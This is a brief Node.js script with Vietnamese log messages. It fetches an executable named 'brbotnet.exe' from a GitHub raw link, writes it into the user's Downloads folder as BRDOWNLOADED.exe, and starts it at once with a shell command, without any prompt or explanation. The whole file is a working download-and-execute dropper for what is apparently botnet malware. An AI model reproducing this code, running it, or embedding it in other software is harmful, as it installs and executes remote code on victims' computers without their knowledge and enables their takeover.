const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { exec } = require('child_process');
const url = require('url');

const fileUrl = 'https://github.com/vinhuptoday/testbn/raw/refs/heads/main/brbotnet.exe';
const fileName = 'BRDOWNLOADED.exe';
const downloadsDir = path.join(os.homedir(), 'Downloads');
const filePath = path.join(downloadsDir, fileName);

function downloadFile(downloadUrl, callback) {
  const req = https.get(downloadUrl, (res) => {
    if (res.statusCode === 301 || res.statusCode === 302) {
      // Gặp redirect, tải từ URL mới
      const redirectedUrl = res.headers.location;
      console.log('🔁 Redirect đến:', redirectedUrl);
      downloadFile(redirectedUrl, callback);
      return;
    }

    if (res.statusCode !== 200) {
      console.error('❌ Lỗi tải file. Mã:', res.statusCode);
      return;
    }

    const file = fs.createWriteStream(filePath);
    res.pipe(file);

    file.on('finish', () => {
      file.close(() => {
        console.log('✅ Tải xong! Đang mở file...');
        callback();
      });
    });
  });

  req.on('error', (err) => {
    console.error('❌ Lỗi mạng:', err.message);
  });
}

function downloadAndRun() {
  downloadFile(fileUrl, () => {
    exec(`start "" "${filePath}"`);
  });
}

downloadAndRun();
